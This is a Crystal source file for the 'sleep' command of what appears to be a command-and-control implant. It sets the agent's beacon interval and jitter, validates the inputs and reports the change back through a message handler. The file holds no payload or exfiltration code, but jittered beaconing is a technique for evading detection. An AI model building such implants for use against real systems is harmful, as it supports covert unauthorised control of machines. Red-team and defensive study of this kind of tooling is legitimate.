require "./base"
require "../transport"

module Dark::Agent::Commands
  class Sleep < Base
    def name : String
      "sleep"
    end

    def execute(task : JSON::Any) : Nil
      task_id = task["id"]?.try(&.as_s) || ""
      sleep_time = task["parameters"]["seconds"]?.try(&.as_i) || 60
      jitter = task["parameters"]["jitter"]?.try(&.as_i) || 30

      if sleep_time < 0
        MessageHandler.add_response(task_id, :error, "Invalid sleep time: must be a non-negative integer")
        return
      end

      if jitter < 0 || jitter > 100
        MessageHandler.add_response(task_id, :error, "Invalid jitter: must be between 0 and 100")
        return
      end

      # Update the global sleep settings
      transport = Dark::Agent::Transport::Active.instance
      transport.sleep_time = sleep_time
      transport.jitter = jitter
      transport.interrupt_current_sleep

      msg = if sleep_time == 0
        "Sleep interval disabled (set to 0s)"
      elsif jitter > 0
        "Sleep interval updated to #{sleep_time}s with #{jitter}% jitter"
      else
        "Sleep interval updated to #{sleep_time}s"
      end

      # Create callback with updated sleep info
      callback_data = {
        "sleep_info" => JSON::Any.new({"interval" => sleep_time, "jitter" => jitter}.to_json)
      }

      MessageHandler.add_response(task_id, :success, msg, callback: callback_data)
    end
  end
end